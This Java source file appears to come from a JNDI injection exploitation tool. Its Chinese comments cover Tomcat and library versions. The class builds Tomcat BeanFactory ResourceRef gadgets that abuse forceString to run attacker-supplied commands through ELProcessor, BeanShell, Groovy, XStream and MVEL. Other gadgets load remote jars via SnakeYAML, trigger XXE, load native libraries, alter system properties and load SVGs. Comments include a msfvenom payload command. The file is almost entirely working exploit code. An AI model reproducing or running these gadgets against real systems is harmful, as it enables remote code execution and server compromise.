package sonomon.jndi.factory;

import javax.naming.StringRefAddr;
import org.apache.naming.ResourceRef;
import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.deser.Payload;

public class BeanFactory {
	
	//tomcat-catalina-8.5.57.jar
	//太高的tomcat和太低的tomcat均没有forceString,只能调setter,导致利用方法减少
	//Tomcat低版本(7.0.4)
	//Tomcat高版本(9.0.63、8.5.79)
	static String factory = "org.apache.naming.factory.BeanFactory";
	
	
	//tomcat-jasper-el-8.5.57.jar/tomcat-el-api-8.5.57.jar
	//小于Tomcat8时好像没有javax.el.ELProcessor
	public static ResourceRef elbypass(String cmd) throws Exception {
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true, factory, null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
    	String elString = Payload.getElPayload(cmd);
        ref.add(new StringRefAddr("x", elString));
        return ref;
	}
	//bsh-2.0b6.jar
	//bsh也可以反序列化，但是bsh-2.0b6无法反序列化刚好可以填补空白
	public static ResourceRef bshbypass(String cmd) throws Exception {
        ResourceRef ref = new ResourceRef("bsh.Interpreter", null, "", "", true, factory, null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
		String bsh = "isWin = java.lang.System.getProperty(\"os.name\").toLowerCase().contains(\"win\");"
				+ "if(isWin){new java.lang.ProcessBuilder(new String[]{\"cmd.exe\",\"/c\",\""+cmd+"\"}).start();}"
				+ "else{new java.lang.ProcessBuilder(new String[]{\"/bin/bash\",\"-c\",\""+cmd+"\"}).start();}";
        try {
			if (Deserialize.isDefaultPayload(cmd)) {
				String base64String = Deserialize.getBase64TemplatesImplclass(cmd);
				bsh = "bs = java.util.Base64.getDecoder().decode(\""+base64String+"\");"
		    			+ "obj = new com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl();"
		    			+ "field = obj.getClass().getDeclaredField(\"_name\");"
		    			+ "field.setAccessible(true);"
		    			+ "field.set(obj, \"TemplatesImpl\");"
		    			+ "field = obj.getClass().getDeclaredField(\"_tfactory\");"
		    			+ "field.setAccessible(true);"
		    			+ "field.set(obj, new com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl());"
		    			+ "field = obj.getClass().getDeclaredField(\"_bytecodes\");"
		    			+ "field.setAccessible(true);"
		    			+ "field.set(obj, new byte[][]{bs});"
		    			+ "obj.getOutputProperties();";
			}
		} catch (Exception e) {
			System.out.println("BeanFactory bshbypass error");
		}
        ref.add(new StringRefAddr("x", bsh));
        return ref;
	}
	//groovy-2.4.12
	public static ResourceRef groovyclassloaderbypass(String cmd) throws Exception {
		ResourceRef ref = new ResourceRef("groovy.lang.GroovyClassLoader", null, "", "", true, factory, null);
		ref.add(new StringRefAddr("forceString", "x=parseClass"));
		String script = "@groovy.transform.ASTTest(value={\n" +
		" assert java.lang.Runtime.getRuntime().exec(\""+cmd+"\")\n" +
		"})\n" +
		"def x\n";
		ref.add(new StringRefAddr("x",script));
        return ref;
	}
	//groovy-2.4.12
	public static ResourceRef groovyshellbypass(String cmd){
		ResourceRef ref = new ResourceRef("groovy.lang.GroovyShell", null, "", "", true, factory, null);
		ref.add(new StringRefAddr("forceString", "x=evaluate"));
		String script = "@groovy.transform.ASTTest(value={\n" +
		" assert java.lang.Runtime.getRuntime().exec(\""+cmd+"\")\n" +
		"})\n" +
		"def x\n";
		ref.add(new StringRefAddr("x",script));
        return ref;
	}
	//snakeyaml-1.22.jar
	//需要远程加载jar包,yaml还存在其他链
	public static ResourceRef yamlbypass(String url){
		//url = "http://127.0.0.1:81/exp.jar";
	    ResourceRef ref = new ResourceRef("org.yaml.snakeyaml.Yaml", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=load"));
	    String yaml = "!!javax.script.ScriptEngineManager [\n" +
	            "  !!java.net.URLClassLoader [[\n" +
	            "    !!java.net.URL [\""+url+"\"]\n" +
	            "  ]]\n" +
	            "]";
	    ref.add(new StringRefAddr("x", yaml));
        return ref;
	}
	//jdk原生XXE
	public static ResourceRef xsloaderbypass(String url){
		//url = "http://127.0.0.1:81/evil.xml";
	    ResourceRef ref = new ResourceRef("com.sun.org.apache.xerces.internal.impl.xs.XSLoaderImpl", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=loadURI"));
	    ref.add(new StringRefAddr("x", url));
        return ref;
	}
	
	//xstream-1.4.10.jar/xmlpull-1.1.3.1.jar/xpp3_min-1.1.4c.jar
	//xstream还存在其他链
	public static ResourceRef xstreambypass(String cmd){
	    ResourceRef ref = new ResourceRef("com.thoughtworks.xstream.XStream", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=fromXML"));
	    String xml = "<java.util.PriorityQueue serialization='custom'>\n" +
	            "  <unserializable-parents/>\n" +
	            "  <java.util.PriorityQueue>\n" +
	            "    <default>\n" +
	            "      <size>2</size>\n" +
	            "    </default>\n" +
	            "    <int>3</int>\n" +
	            "    <dynamic-proxy>\n" +
	            "      <interface>java.lang.Comparable</interface>\n" +
	            "      <handler class='sun.tracing.NullProvider'>\n" +
	            "        <active>true</active>\n" +
	            "        <providerType>java.lang.Comparable</providerType>\n" +
	            "        <probes>\n" +
	            "          <entry>\n" +
	            "            <method>\n" +
	            "              <class>java.lang.Comparable</class>\n" +
	            "              <name>compareTo</name>\n" +
	            "              <parameter-types>\n" +
	            "                <class>java.lang.Object</class>\n" +
	            "              </parameter-types>\n" +
	            "            </method>\n" +
	            "            <sun.tracing.dtrace.DTraceProbe>\n" +
	            "              <proxy class='java.lang.Runtime'/>\n" +
	            "              <implementing__method>\n" +
	            "                <class>java.lang.Runtime</class>\n" +
	            "                <name>exec</name>\n" +
	            "                <parameter-types>\n" +
	            "                  <class>java.lang.String</class>\n" +
	            "                </parameter-types>\n" +
	            "              </implementing__method>\n" +
	            "            </sun.tracing.dtrace.DTraceProbe>\n" +
	            "          </entry>\n" +
	            "        </probes>\n" +
	            "      </handler>\n" +
	            "    </dynamic-proxy>\n" +
	            "    <string>"+cmd+"</string>\n" +
	            "  </java.util.PriorityQueue>\n" +
	            "</java.util.PriorityQueue>";
	    ref.add(new StringRefAddr("x", xml));
        return ref;
	}
	//mvel2-2.4.14.Final.jar
	public static ResourceRef mvelbypass(String cmd){
	    ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=exec"));
	    String mvel = "push Runtime.getRuntime().exec('"+cmd+"');";
	    ref.add(new StringRefAddr("x", mvel));
        return ref;
	}
	//需要本地加载动态链接库,默认目录为java的bin目录,windows环境会变为xxx.dll,mac环境会变为lib/xxx.dylib,linux环境会变为lib/xxx.so,因此较难利用
	//msfvenom -p windows/x64/exec cmd="calc.exe" exitfunc=thread -f dll -o calc.dll
	//linux gcc编译即可
	public static ResourceRef libloaderbypass(String path){
		//path = "../../../../../../Users/luoke/Downloads/calc";
	    ResourceRef ref = new ResourceRef("com.sun.glass.utils.NativeLibLoader", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=loadLibrary"));
	    ref.add(new StringRefAddr("x", path));
        return ref;
	}
	
	public static ResourceRef configbypass(String url){
		//此bypass基本无用
		
		//url = "http://127.0.0.1:81/exp.properties";
		//exp.properties内容如下,可以篡改jdk环境变量,但面对tomcat/spring环境无法生效,原理见https://xz.aliyun.com/t/13127
		//对于篡改tocmat一些配置可能需要开启热加载
		
		//os.name=Windows 10
		//com.sun.jndi.ldap.object.trustURLCodebase=true
		//com.sun.jndi.rmi.object.trustURLCodebase=true
		
		//使用BeanFactory调setter会检测是否存在对应的属性,GenericNamingResourcesFactory则不用,因此GenericNamingResourcesFactory更加通用
		//也因此这里必须用forceString
		
		//替代类如下
		//org.apache.commons.configuration2.SystemConfiguration //commons-configuration2
		//org.apache.groovy.util.SystemUtil  //groovy >= 3.0才有的
	    ResourceRef ref = new ResourceRef("org.apache.commons.configuration.SystemConfiguration", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("forceString", "x=setSystemProperties"));
	    ref.add(new StringRefAddr("x", url));
        return ref;
        
        
	}
	
	public static ResourceRef svgbypass(String url){
		//此链是为了应对高版本tomcat BeanFactory没有forceString
		
		//url = "http://127.0.0.1:81/RCE.svg";
		//详情见CVE-2022-39197
		//实际用起来似乎因为classloader的原因,没法远程加载jar包,只能依赖js.jar进行XSS-RCE
	    ResourceRef ref = new ResourceRef("org.apache.batik.swing.JSVGCanvas", null, "", "", true, factory, null);
	    ref.add(new StringRefAddr("URI", url));
        return ref;  
	}
	

}
